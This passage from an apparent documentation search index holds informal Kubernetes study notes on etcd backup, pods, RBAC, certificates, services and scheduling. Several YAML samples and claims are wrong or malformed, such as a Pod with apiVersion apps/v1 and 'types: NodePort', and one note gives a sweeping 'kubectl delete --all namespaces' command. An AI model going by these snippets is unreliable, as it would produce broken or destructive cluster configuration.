nodes</code></p>"},{"location":"kubernetes/maintanence/#update-version-in-cluster","title":"update version in cluster","text":"<ol> <li>drain nodes</li> <li>upate 3.systemctl restart daemon and kubelet</li> <li>kubectl uncordon</li> </ol>"},{"location":"kubernetes/maintanence/#in-node","title":"in node","text":"<p>we need kubeadm upgrade node too</p>"},{"location":"kubernetes/maintanence/#etcd-backup","title":"ETCD backup","text":"<p><code>ETCDCTL_API=3 etcdctl --endpoints=https://[127.0.0.1]:2379 \\  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\  --cert=/etc/kubernetes/pki/etcd/server.crt \\  --key=/etc/kubernetes/pki/etcd/server.key \\  snapshot save /opt/snapshot-pre-boot.db</code></p>"},{"location":"kubernetes/maintanence/#etcd-restore","title":"ETCD restore","text":"<p><code>ETCDCTL_API=3 etcdctl  --data-dir /var/lib/etcd-from-backup snapshot restore /opt/snapshot-pre-boot.db</code></p> <p>update /etc/kubernetes/manifests/etcd.yaml  and update volume:hostapath   and VolimeMount</p>"},{"location":"kubernetes/maintanence/#check-membrs-from-external-etcd","title":"check membrs from external etcd","text":"<p><code>ETCDCTL_API=3 etcdctl \\  --endpoints=https://127.0.0.1:2379 \\  --cacert=/etc/etcd/pki/ca.pem \\  --cert=/etc/etcd/pki/etcd.pem \\  --key=/etc/etcd/pki/etcd-key.pem \\   member list</code></p>"},{"location":"kubernetes/maintanence/#get-link-for-snapshot","title":"get link for snapshot","text":"<p><code>kubectl describe  pods -n kube-system etcd-cluster1-controlplane  | grep advertise-client-urls</code></p>"},{"location":"kubernetes/maintanence/#get-all-keys","title":"get all keys","text":"<p><code>kubectl describe  pods -n kube-system etcd-cluster1-controlplane  | grep pki</code></p>"},{"location":"kubernetes/monitoring/","title":"Monitoring","text":""},{"location":"kubernetes/monitoring/#logging-and-monitoring","title":"logging and monitoring","text":"<p>kubelet contains anther tool named Cadvisor whhich monitors perfomance</p>"},{"location":"kubernetes/monitoring/#enable-with-minikube","title":"enable with minikube","text":"<p><code>minikube addons enable  metrics-server</code></p>"},{"location":"kubernetes/monitoring/#other","title":"other","text":"<p><code>git clone https://github.com/kodekloudhub/kubernetes-metrics-server.git</code></p>"},{"location":"kubernetes/monitoring/#show-stats","title":"show stats","text":"<p><code>kubectl top node</code> <code>kubectl top pod</code></p>"},{"location":"kubernetes/monitoring/#docker-logs","title":"docker  logs","text":"<p><code>docker log -f dockername</code></p> <p><code>kubectl logs -f podname</code></p>"},{"location":"kubernetes/monitoring/#if-in-pods-are-miltiple-container-u-have-to-specify-name","title":"if in pods are miltiple container u have to specify name","text":""},{"location":"kubernetes/namespaces/","title":"Namespaces","text":""},{"location":"kubernetes/namespaces/#default-namespace","title":"default namespace","text":"<p>kubernetes default uses namespace named default , kubesystem and kubepublic</p> <p>when service is created dns name automaticly assigned resources in namespace can refer by its name</p> <p><code>.connect(\"db-service\")</code></p>"},{"location":"kubernetes/namespaces/#to-connect-database-in-another-namspace","title":"to connect database in another namspace","text":"<p><code>.connect(\"db-service.namespace.service.domain.domainlocal\")</code></p> <p><code>kubectl get pods --namespace=anothername</code></p>"},{"location":"kubernetes/namespaces/#creating-pods-in-namespace","title":"creating pods in namespace","text":"<p><code>kubectl create -f pod.yml --namespace=dev</code> or add namespace under metadata section in yml</p>"},{"location":"kubernetes/namespaces/#creating-namespaces","title":"creating namespaces","text":"<pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev\n</code></pre> <p><code>kubectl create -f namespace-dev.yaml</code> <code>kubectl create namespace dev</code></p>"},{"location":"kubernetes/namespaces/#set-default-namespace-for-command","title":"set default namespace for command","text":"<p><code>kubectl config set-context $(kubectl config current-context) --namespace=dev</code> <code>kubectl get pods</code></p>"},{"location":"kubernetes/namespaces/#show-pods-in-all-namespaces","title":"show pods in all namespaces","text":"<p><code>kubectl get pods --all-namespaces</code></p>"},{"location":"kubernetes/namespaces/#limit-resources-in-namespace-using-resourcequota","title":"limit resources in namespace using ResourceQuota","text":"<p><code>`yml `apiVersion: v1 kind: ResourceQuota metadata:   name: compute-quota   namespace: dev spec:   hard:     pods: \"10\"     requests.cpu: \"4\"     requests.memory: 5Gi     limits.cpu: \"10\"     limits.memory: 10Gi</code></p> <p><code>kubectl create -f quota.yml</code></p>"},{"location":"kubernetes/newtwork/","title":"Network","text":"<ul> <li>Ingress   ingress:</li> <li>from:<ul> <li>podSelector:     matchLabels:       role: api-pod ports:</li> <li>protocol: TCP   port: 3306</li> </ul> </li> </ul>"},{"location":"kubernetes/pods/","title":"Pods","text":""},{"location":"kubernetes/pods/#pods-yaml","title":"pods yaml","text":"<pre><code>apiVersion: apps/v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    app: myapp\n    type: front-end\nspec:\n   containers:\n   - name: nginx-container\n     image: nginx\n</code></pre> <p><code>kubectl create -f pod.yml</code></p> <p>show pods <code>kubectl get pods</code></p> <p>show detail info</p>"},{"location":"kubernetes/pods/#create-simple-yml-file","title":"create simple yml file","text":"<p><code>kubectl run redis --image=redis123 --dry-run=client -o yaml &gt; redis-definition.yaml</code></p>"},{"location":"kubernetes/pods/#apply-changes","title":"apply changes","text":"<p><code>kubectl apply -f redis-definition.yaml</code></p>"},{"location":"kubernetes/pods/#add-tolerration-to-pods","title":"add tolerration to pods","text":"<pre><code>apiVersion: apps/v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    app: myapp\n    type: front-end\nspec:\n   containers:\n   - name: nginx-container\n     image: nginx\n\n   tolerration:\n   -key:app \n   operator: \"equal\"\n   value: blue\n   effect: Noschedle | PreferNoSchedule|NoExecute\n</code></pre>"},{"location":"kubernetes/pods/#limit-resource","title":"limit resource","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: simple-webapp-color\n  labels:\n    name: simple-webapp-color\nspec:\n containers:\n - name: simple-webapp-color\n   image: simple-webapp-color\n   ports:\n    - containerPort:  8080\n   resources:\n     requests:\n      memory: \"1Gi\"\n      cpu: \"1\"\n</code></pre>"},{"location":"kubernetes/pods/#default-pods-vcpu-value-is-1-and-512-mi-memory","title":"default pods VCPU value is 1 and 512 Mi memory","text":"<p>pods can use more memory that needed but it  is permanently it will be terminated</p>"},{"location":"kubernetes/pods/#static-pods","title":"Static pods","text":"<p>if we have only kubelet on server ,but kubelet can create pods. we can provide kubelet to read pod definition files.</p> <p>we can add yml files /etc/kubernetes/manifests/ folder and kubelet automaticly create this pods. if we delete that file. pod will be removed. it works only with Pods. we can add service parameter to change path --pod-manifest-path=/home/davit/kubemanifest</p> <p>or kubeconfig.yaml if it is  not service.</p> <p>use docker ps to see pods</p>"},{"location":"kubernetes/pods/#use-custom-sheduler","title":"use custom sheduler","text":"<p>under spec:   schedulerName: custom-scheduler</p>"},{"location":"kubernetes/pods/#view-events","title":"view events","text":"<p><code>kubectl get events</code></p>"},{"location":"kubernetes/pods/#get-all-pods","title":"get all pods","text":"<p><code>kubectl get pods --all-namespaces</code></p>"},{"location":"kubernetes/pods/#pod-sample","title":"pod sample","text":"<p><code>kubectl run redis --image=redis:alpine --dry-run=client -o yaml &gt; redis.yaml</code></p>"},{"location":"kubernetes/pods/#exmpose-pod-directly-nodeport","title":"exmpose pod directly NodePort","text":"<p><code>kubect run custom-nginx --image=ngin --port=8080</code></p>"},{"location":"kubernetes/pods/#expose-pod-clusterip","title":"expose pod ClusterIp","text":"<p><code>kubectl run httpd --image=httpd:alpine --port=80 --expose</code></p>"},{"location":"kubernetes/pods/#get-system-cluster-pods","title":"get system cluster pods","text":"<p><code>kubectl get pods --namespace kube-system</code></p>"},{"location":"kubernetes/pods/#filter-pods-by-selector","title":"filter pods by selector","text":"<p><code>kubectl get pods --selector env=dev</code></p>"},{"location":"kubernetes/pods/#get-all-objects-using-selector","title":"get all objects using selector","text":"<p><code>kubectl get all --selector env=prod</code></p>"},{"location":"kubernetes/pods/#multiple-selectors","title":"multiple selectors","text":"<p><code>kubectl get pods --selector env=prod,bu=finance,tier=frontend</code></p>"},{"location":"kubernetes/pods/#create-yaml-from-running-pod","title":"create yaml from running pod","text":"<p><code>kubectl get pod elephant -o yaml &gt; elep.yaml</code></p>"},{"location":"kubernetes/pods/#replace-pod-by-force","title":"replace pod by force","text":"<p><code>kubectl replace -f elephant.yaml --force</code></p>"},{"location":"kubernetes/pods/#detect-static-pods","title":"detect static pods","text":"<p>controlplane at the end of pods name</p>"},{"location":"kubernetes/pods/#get-wide-info-with-pods","title":"get wide info with pods","text":"<p><code>kubectl get pods -o wide</code></p>"},{"location":"kubernetes/pods/#add-arguments-to-pods","title":"add arguments to pods","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: ubuntu-sleeper-pod\nspec:\n containers:\n - name: ubuntu-sleeper\n   image: ubuntu-sleeper\n   command: [\"sleep2.0\"]\n   args: [\"10\"]\n</code></pre>"},{"location":"kubernetes/pods/#add-env-variables-in-yml","title":"add env variables in yml","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: simple-webapp-color\nspec:\n containers:\n - name: simple-webapp-color\n   image: simple-webapp-color\n   ports:\n   - containerPort: 8080\n   env:\n   - name: APP_COLOR\n     value: pink\n</code></pre>"},{"location":"kubernetes/pods/#add-env-with-configmaps","title":"add env with configmaps","text":"<p><code>kubectl create configmap app-config --from-literal=APP_COLOR=blue --from-literal=APP_MODE=prod</code> <code>kubectl create configmap app-config --from-file=app_config.properties (Another way)</code></p> <p>or </p> <p><code>yaml apiVersion: v1 kind: ConfigMap metadata:  name: app-config data:  APP_COLOR: blue  APP_MODE: prod</code></p> <p><code>kubectl get configmaps</code></p>"},{"location":"kubernetes/pods/#map-configmap","title":"map configmap","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: simple-webapp-color\nspec:\n containers:\n - name: simple-webapp-color\n   image: simple-webapp-color\n   ports:\n   - containerPort: 8080\n   envFrom:\n   - configMapRef:\n       name: app-config\n</code></pre>"},{"location":"kubernetes/pods/#we-can-inject-using-volumes-too","title":"we can inject using volumes too","text":""},{"location":"kubernetes/pods/#use-secrets-for-passwords","title":"use Secrets for passwords","text":"<p><code>kubectl create secret generic app-secret --from-literal=DB_Host=mysql --from-literal=DB_User=root --from-literal=DB_Password=paswrd</code> <code>kubectl create secret generic app-secret --from-file=app_secret.properties</code></p> <p><code>echo -n \"mysql\" | base64</code></p> <p><pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n name: app-secret\ndata:\n  DB_Host: bX1zcWw=\n  DB_User: cm9vdA==\n  DB_Password: cGFzd3Jk\n</code></pre> <code>kubectl create -f secret-data.yaml</code></p> <p><code>kubectl get secrets</code></p>"},{"location":"kubernetes/pods/#get-data","title":"get data","text":"<p><code>kubectl get secret app-secret -o yaml</code></p>"},{"location":"kubernetes/pods/#if-it-is-mounted-as-volume","title":"if it is mounted as Volume","text":"<p>each password will we as file like /opt/passwords</p>"},{"location":"kubernetes/pods/#multiple-container-pods","title":"multiple container pods","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: simple-webapp\n  labels:\n    name: simple-webapp\nspec:\n  containers:\n  - name: simple-webapp\n    image: simple-webapp\n    ports:\n    - ContainerPort: 8080\n  - name: log-agent\n    image: log-agent\n</code></pre>"},{"location":"kubernetes/replicasets/","title":"ReplicaSets","text":""},{"location":"kubernetes/replicasets/#replication-controller","title":"replication controller","text":"<p>Replication Controller is the older technology that is being replaced by a ReplicaSet. ReplicaSet is the new way to setup replication. automaticaly bring new pods if needed</p>"},{"location":"kubernetes/replicasets/#load-balancing-scaling","title":"Load balancing &amp; scaling","text":"<pre><code>apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: myapp-rc\n  labels:\n    app: myapp\n    type: front-end\nspec:\n template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n        type: front-end\n    spec:\n     containers:\n     - name: nginx-container\n       image: nginx\n replicas: 3\n</code></pre> <p><code>kubectl create -f replica.yml</code></p> <p><code>kubectl get replicationcontroller</code></p> <pre><code>apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: myapp-replicaset\n  labels:\n    app: myapp\n    type: front-end\nspec:\n template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n        type: front-end\n    spec:\n     containers:\n     - name: nginx-container\n       image: nginx\n replicas: 3\n selector:\n   matchLabels:\n    type: front-end\n</code></pre> <p>replica set needs selector definition</p>"},{"location":"kubernetes/replicasets/#scale-replica-sets","title":"scale replica sets","text":"<p>update file</p> <p><code>kubectl replace -f replica.yml</code></p> <p><code>kubectl scale --replicas=6 -f replica.yml</code></p> <p><code>kubectl scale --replicas=6 replicaset myapp-replicaset</code></p>"},{"location":"kubernetes/replicasets/#delete-replicaset","title":"delete replicaset","text":"<p><code>kubectl delete replicaset myapp-replicaset</code> <code>kubectl delete --all namespaces</code></p>"},{"location":"kubernetes/replicasets/#get-replicasetso","title":"get replicasetso","text":"<p><code>kubectl get replicasets.apps</code></p>"},{"location":"kubernetes/replicasets/#describe","title":"describe","text":"<p><code>kubectl describe replicasets.apps new-replica-set</code></p>"},{"location":"kubernetes/replicasets/#get-version-of-replicaset","title":"get version of replicaset","text":"<p><code>kubectl explain replicaset | grep VERSION</code></p>"},{"location":"kubernetes/replicasets/#edit-replica-uses-editor-automaticaly","title":"edit replica, uses editor automaticaly","text":"<p><code>kubectl edit replicaset new-replica-set</code></p>"},{"location":"kubernetes/roles/","title":"Roles","text":""},{"location":"kubernetes/roles/#create-role","title":"CREATE ROLE","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: cluster-administrator\nrules:\n- apiGroups: [\"\"] # \"\" indicates the core API group\n  resources: [\"nodes\"]\n  verbs: [\"get\", \"list\", \"delete\", \"create\"]\n</code></pre> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: cluster-admin-role-binding\nsubjects:\n- kind: User\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-administrator\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"kubernetes/roles/#service-account-as-bot-account","title":"SERVICE ACCOUNT AS BOT ACCOUNT","text":"<p><code>kubectl create serviceaccount dashboard-sa</code> <code>kubectl get serviceaccounts</code></p> <p><code>kubectl describe serviceaccount dashboiard-sa</code></p>"},{"location":"kubernetes/roles/#get-secreet","title":"get secreet","text":"<p><code>kubectl describe secret dashboard-sa-token-kbbdm</code></p>"},{"location":"kubernetes/roles/#secrets-are-mounter-varrunsecretkubernetisioserviceaccount","title":"secrets are mounter /var/run/secret/kubernetis.io/serviceaccount","text":"<p>in Pod xml:   serviceAccount:dashboard-sa   automountServiceAccountToken: false</p>"},{"location":"kubernetes/roles/#get-roles","title":"get roles","text":"<p><code>kubectl get roles</code></p>"},{"location":"kubernetes/roles/#describe-role","title":"describe role","text":"<p><code>kubectl describe role kube-proxy -n kube-system</code></p>"},{"location":"kubernetes/roles/#describe-rolebinding","title":"describe rolebinding","text":"<p><code>kubectl describe rolebinding kube-proxy -n kube-system</code></p>"},{"location":"kubernetes/roles/#use-command-as-different-role","title":"use command as different role","text":"<p><code>--as dev-user</code></p>"},{"location":"kubernetes/roles/#create-role_1","title":"create role","text":"<pre><code>kind: Role\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  namespace: default\n  name: developer\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"list\", \"create\",\"delete\"]\n</code></pre>"},{"location":"kubernetes/roles/#create-rolebind","title":"create rolebind","text":"<pre><code>kind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  name: dev-user-binding\nsubjects:\n- kind: User\n  name: dev-user\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: developer\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"kubernetes/security/","title":"Security","text":""},{"location":"kubernetes/security/#cluster-cluster","title":"cluster cluster","text":"<p>who can acess? how: username and password username and tokens certificates externale auth providers - ldap service accounts</p>"},{"location":"kubernetes/security/#authorization","title":"authorization","text":"<p>RBAC - role based  ABAC NODE auth webhook mode</p>"},{"location":"kubernetes/security/#tls-sertificates","title":"TLS sertificates","text":""},{"location":"kubernetes/security/#between-applications","title":"between applications","text":"<p>all can access each other but it can be restricted with network policies</p>"},{"location":"kubernetes/security/#users","title":"Users","text":"<p>we can not create users in kubernetes but we can create service accounts <code>kubectl create service account</code></p>"},{"location":"kubernetes/security/#accounts","title":"accounts","text":"<p>managed by kube-apiserver authenticate user</p>"},{"location":"kubernetes/security/#static-file-auth","title":"static file auth","text":"<p>password,user,user_id,group --basic-auth-file = details.csv</p>"},{"location":"kubernetes/security/#static-token-file","title":"static token file","text":"<p>token,user,uid, group --token-auth-file = token.csv</p>"},{"location":"kubernetes/security/#ssl-tls-sertificates","title":"SSL TLS sertificates","text":""},{"location":"kubernetes/security/#creting-certificates","title":"creting certificates","text":"<p>private key <code>openssl genrsa -out ca.key 2048</code> specify name of what is for. this is signing <code>openssl req -new -key ca.key -subj \"/CN=KUBERNETES-CA\" -out ca.csr</code> sign request. this is self signed <code>openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt</code></p>"},{"location":"kubernetes/security/#generate-client-certificeates","title":"generate client certificeates","text":"<p><code>openssl genrsa -out admin.key 2048</code> this name is for logs mostly <code>openssl req -new -key ca.key -subj \"/CN=kube-admin\" -out admin.csr</code> we must mention group details in signing request <code>openssl x509 -req -in admin.csr -CA ca.crt -CAkey  ca.key -out admin.crt</code></p>"},{"location":"kubernetes/security/#why-we-need-certs","title":"why we need certs","text":"<p>we cen auth to kluster apiserver using this key or in cluster definiton we can add this keys</p>"},{"location":"kubernetes/security/#ca-root-certificates-needed-for-client","title":"CA root certificates needed for client","text":"<p>if there is more dns names we have create openssl conf</p>"},{"location":"kubernetes/security/#user-kubelet-certificates-by-its-node-names","title":"user kubelet certificates by its node names","text":"<p>to dermined which node is requested</p> <p>name: system:node:node01 system:node:node02</p>"},{"location":"kubernetes/security/#view-certificates","title":"view certificates","text":"<p>kubeadm automaitlcy deploys certs</p> <p><code>openssl x509 -in /etc/kubernetes/pki/apiserver.crt -text -noout</code></p>"},{"location":"kubernetes/security/#what-if-new-admin-comes","title":"what if new admin comes","text":"<p>CA server - pair of certificates files certificates key is on CA server.</p>"},{"location":"kubernetes/security/#certificates-api","title":"certificates API","text":"<p>create CertificateeSigningRequest object and can be reviewd approved </p>"},{"location":"kubernetes/security/#how-it-is-done","title":"how it is done","text":"<p><code>openssl genrsa -out jane.key 204</code></p> <p><code>openssl req -new -key jane.key -subj =\"/CN=jane\" out -jane.csr</code></p> <pre><code>apiVersion: certificates.k8s.io/v1beta1\nkind: CertificateSigningRequest\nmetadata:\n  name: jane\nspec:\n  groups:\n  - system:authenticated\n  usages:\n  - digital signature\n  - key encipherment\n  - server auth\n  request:\n    &lt;certificate-goes-here&gt;\n</code></pre> <p><code>cat jane.csr |base64</code> &gt; and paster in requet above </p>"},{"location":"kubernetes/security/#show-request","title":"show request","text":"<p><code>kubectl get csr</code></p>"},{"location":"kubernetes/security/#aprove-requests","title":"aprove requests","text":"<p><code>kubectl certificate approve jane</code></p> <p>it automaticly generates  client certificates</p> <p><code>kubectl get csr jane -o yaml</code></p> <p><code>echo cert| base --decode</code> and share to user</p>"},{"location":"kubernetes/security/#all-the-certificates-are-managed-by-controller-manager","title":"all the certificates are managed by controller manager","text":""},{"location":"kubernetes/security/#kubeconfigtes","title":"kubeconfigtes","text":"<p>default config <code>.kube/config</code></p> <ul> <li>clusters</li> <li>development</li> <li>production</li> <li>google</li> <li>contexts</li> <li>admin@production</li> <li>google@production</li> <li>Users</li> <li>admin</li> <li>dev</li> </ul>"},{"location":"kubernetes/security/#view-config","title":"view config","text":"<p><code>kubectl config view</code> <code>kubectl config use-context prod-user@production</code> <code>kubectl config -h</code></p>"},{"location":"kubernetes/security/#config-namespaces","title":"config namespaces","text":"<p>add namespace in config to switch automaticly</p>"},{"location":"kubernetes/security/#api-group","title":"api group","text":"<p>curl http://localhost:6443 -k and add certs</p> <p>or kubectl proxy  it is not kube proxy</p>"},{"location":"kubernetes/security/#authorization-what-they-can-do","title":"authorization - what they can do","text":""},{"location":"kubernetes/security/#different-types-of-authorization","title":"different types of authorization","text":"<ul> <li>node</li> <li>abac</li> <li>can view pod</li> <li>can delete pod</li> <li>needs policie definiton file</li> <li>it is bad practice</li> <li>RBAC</li> <li>we define role</li> <li>associate role to users</li> <li>webhook</li> <li>we need auth to be managed to another tool</li> <li> <p>for example open policy agent</p> </li> <li> <p>AlwaysAllow</p> </li> <li>AllwaysDeny systemctl - &gt; --authorization-mode= </li> </ul>"},{"location":"kubernetes/security/#authorization_1","title":"authorization","text":""},{"location":"kubernetes/security/#abac","title":"abac","text":"<p>dev-user - access using policy file in json format. every time we need change we have to change file and restart server</p>"},{"location":"kubernetes/security/#rbac","title":"RBAC","text":"<ul> <li>create roles and add users to this role</li> </ul>"},{"location":"kubernetes/security/#webhook","title":"webhook","text":"<p>openpolycyagent third party auth</p>"},{"location":"kubernetes/security/#alwaysallow-and-allwaysdeny","title":"AlwaysAllow and AllwaysDeny","text":"<p>by default is AlwaysAllow</p> <p>--authorization-mode=None,RBAC,Webhook</p>"},{"location":"kubernetes/security/#certificate-apprval-example","title":"certificate apprval example","text":"<p><code>cat akshay.csr | base64 -w 0</code> -w - wrap 0 `--- apiVersion: certificates.k8s.io/v1 kind: CertificateSigningRequest metadata:   name: akshay spec:   groups:   - system:authenticated   request: CCCCCCC   signerName: kubernetes.io/kube-apiserver-client   usages:   - client auth`` ```</p>"},{"location":"kubernetes/security/#check-status","title":"check status","text":"<p><code>kubectl get csr</code></p>"},{"location":"kubernetes/security/#approve-csr","title":"approve csr","text":"<p><code>kubectl certificate approve akshay</code></p>"},{"location":"kubernetes/security/#get-detals-of-cst","title":"get  detals of cst","text":"<p><code>kubectl get csr agent-smith -o yaml</code></p>"},{"location":"kubernetes/security/#deny-reject","title":"deny reject","text":"<p><code>kubectl certificate deny agent-smith</code></p>"},{"location":"kubernetes/security/#delete-csr","title":"delete csr","text":"<p><code>kubectl delete csr agent-smith</code></p>"},{"location":"kubernetes/services/","title":"Services","text":""},{"location":"kubernetes/services/#services","title":"Services","text":"<p>Services enables communication between various components within and outside of the application.</p>"},{"location":"kubernetes/services/#service-types","title":"Service types","text":""},{"location":"kubernetes/services/#nodeport","title":"NodePort","text":"<p>Where the service makes an internal POD accessible on a POD on the NODE. Where the service makes an internal POD accessible on a POD on the NODE. </p> <p><pre><code>apiVersion: v1\nkind: Service\nmetadata:\n name: myapp-service\nspec:\n types: NodePort\n ports:\n - targetPort: 80\n   port: 80\n   nodePort: 30008\n selector:\n   app:myapp\n   type:front-end\n</code></pre> if there is multiple pods in same node it will load balance</p> <p>else we can access it like ip:port</p> <p><code>kubectl create -f service-definition.yaml</code> <code>kubectl get services</code></p>"},{"location":"kubernetes/services/#cluserip","title":"CluserIP","text":"<p>in nodes if there is multiple applications like fronted backend , db they need to communicate to each other. but communicate with ip is not opation they will change CluserIP gives ability to group this pods under one name and give other pods to access with name.</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n name: back-end\nspec:\n types: ClusterIP\n ports:\n - targetPort: 80\n   port: 80\n selector:\n   app: myapp\n   type: back-end\n</code></pre> <p><code>kubectl get services</code></p>"},{"location":"kubernetes/services/#loadbalacer","title":"LoadBalacer","text":"<p>we can instlal load balancer  like HA or nginx and add node ports . we can user native cloud balancer  useing LoadBalacer service. </p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n name: back-end\nspec:\n types: LoadBalacer\n ports:\n - targetPort: 80\n   port: 80\n selector:\n   app: myapp\n   type: back-end\n</code></pre>"},{"location":"kubernetes/services/#create-sample-yaml-file","title":"create sample yaml file","text":"<p><code>kubectl run redis --image=redis:alpine --dry-run=client -o yaml &gt; redis.yaml</code></p>"},{"location":"kubernetes/services/#create-service-from-command-line","title":"create service from command line","text":"<p><code>kubectl expose pod redis --name redis-service --port=3839</code></p>"},{"location":"kubernetes/sheduler/","title":"Scheduler","text":""},{"location":"kubernetes/sheduler/#sheduler","title":"sheduler","text":""},{"location":"kubernetes/sheduler/#manual-schedulin","title":"manual schedulin","text":"<p>every yml file pod definiton has nodename sheduler looks who doesnot have it and runs scheduling algorithm and binds pod to node</p> <p>if there is not scheduler pods will be in a pending state</p> <pre><code>spec:\n  nodeName: node02\n</code></pre> <p>we cann not update it after pod creation but we can update it with post request</p>"},{"location":"kubernetes/sheduler/#labels-and-selectors","title":"Labels and selectors","text":"<p>Labels are properties attached to items</p> <p>selectors help to filter labels</p> <pre><code> apiVersion: v1\n kind: Pod\n metadata:\n  name: simple-webapp\n  labels:\n    app: App1\n    function: Front-end\n spec:\n  containers:\n  - name: simple-webapp\n    image: simple-webapp\n    ports:\n    - containerPort: 8080\n</code></pre> <p><code>kubectl get pods --selector app=App1</code></p>"},{"location":"kubernetes/sheduler/#to-creaate-replicaset-with-connected-to-pods","title":"to creaate replicaset with connected to pods","text":"<pre><code> apiVersion: apps/v1\n kind: ReplicaSet\n metadata:\n   name: simple-webapp\n   labels:\n     app: App1\n     function: Front-end\n spec:\n  replicas: 3\n  selector:\n    matchLabels:\n     app: App1\n template:\n   metadata:\n     labels:\n       app: App1\n       function: Front-end\n   spec:\n     containers:\n     - name: simple-webapp\n       image: simple-webapp   \n</code></pre>"},{"location":"kubernetes/sheduler/#annotations","title":"annotations","text":"<p>annotations:   buildversion: 1.2 record other details for info </p>"},{"location":"kubernetes/sheduler/#taint-and-tolerations","title":"taint and tolerations","text":"<p>allow certain nodes to accept only specific pods</p> <p><code>kubectl taint nodes node1 app=blue:Noschedule</code></p>"},{"location":"kubernetes/sheduler/#node-affinity","title":"node affinity","text":"<p>certain pods to exact node</p> <p>in master taint automaticly is added</p> <p><code>kubectl describe node kubemaster | grep Taint</code></p>"},{"location":"kubernetes/sheduler/#node-selectors","title":"Node selectors","text":"<p>add nodeSelector in pods spec size: Large</p>"},{"location":"kubernetes/sheduler/#label-nodes","title":"label nodes","text":"<p><code>kubectl label nodes nodename size=Large</code></p> <p>limitation u can not  small or medium</p>"},{"location":"kubernetes/sheduler/#node-affinity_1","title":"node affinity","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n name: myapp-pod\nspec:\n containers:\n - name: data-processor\n   image: data-processor\n affinity:\n   nodeAffinity:\n     requiredDuringSchedulingIgnoredDuringExecution:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: size\n            operator: In\n            values: \n            - Large\n            - Medium\n</code></pre> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n name: myapp-pod\nspec:\n containers:\n - name: data-processor\n   image: data-processor\n affinity:\n   nodeAffinity:\n     requiredDuringSchedulingIgnoredDuringExecution:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: size\n            operator: NotIn\n            values: \n            - Small\n            ```\n\n## requiredDuringSchedulingIgnoredDuringExecution \n\nonly this type of node\n\n## prefferedDuringSchedulingIgnoredDuringExecution \nif not found sheduler ignore affinity rules\n\n\n## requiredDuringSchedulingRequirdDuringExecution\nbad pods automaticly will be deleted\n\n\n## taint and toleration together\nto place exacly where we want\n\n## Daemon Sets\n\nfor example we want logging agent in all cluster and node\nor kube-proxy can be deployed as daemon set\n\n```yml\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: monitoring-daemon\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: monitoring-agent\n  template:\n    metadata:\n     labels:\n       app: monitoring-agent\n    spec:\n      containers:\n      - name: monitoring-agent\n        image: monitoring-agent\n</code></pre> <p><code>kubectl get daemonset</code> <code>kubectl describe daemonset</code></p> <p>deemon sets uses node affinity and taint after 1.x verion before was nodeName:</p>"},{"location":"kubernetes/sheduler/#what-we-want-custom-sheduling-program","title":"what we want custom sheduling program.","text":"<p>kubernetes cluster can have multiple shedulers</p> <p>service options: --scheduler-name:custom-scheduler</p> <p>or name int /etc/kubernetes/manifest/kube-sheduler/yaml</p> <p>and add in command: --scheduler-name=custom-scheduler</p>"},{"location":"kubernetes/sheduler/#if-there-is-multiple-replicas-sheduler-only-one-is-active","title":"if there is multiple replicas sheduler only one is active","text":"<p>there is election process who will be leader</p> <p>where is parameter to aviod newly created schedulers to get leaders</p> <p>--lock-object-name=custom-scheduler</p>"},{"location":"kubernetes/sheduler/#get-logs","title":"get logs","text":"<p><code>kubectl logs custom-scheduler --name-space=kube-system</code></p>"},{"location":"kubernetes/sheduler/#add-taint-node","title":"add taint node","text":"<p><code>kubectl taint nodes nodes01 spray=mortein:NoSchedule</code></p>"},{"location":"kubernetes/sheduler/#remove-taint-node","title":"remove taint node","text":"<p><code>kubectl taint nodes controlplane node-role.kubernetes.io/master:NoSchedule-</code></p>"},{"location":"kubernetes/sheduler/#add-label-to-node","title":"add label to node","text":"<p><code>kubectl label node node01 color=blue</code></p>"},{"location":"kubernetes/sheduler/#get-all-daemonsets","title":"get all daemonsets","text":"<p><code>kubectl get daemonsets --all-namespaces</code></p>"},{"location":"kubernetes/sheduler/#describe-daemon-shedulet-pods","title":"describe daemon shedulet pods","text":"<p><code>kubectl describe daemonset kube-proxy --namespace=kube-system</code></p>"},{"location":"kubernetes/sheduler/#create-daemonset-yaml","title":"create daemonset yaml","text":"<p><code>kubectl create deployment elasticsearch --image=k8s.gcr.io/fluentd-elasticsearch:1.20 -n kube-system --dry-run=client -o yaml &gt; 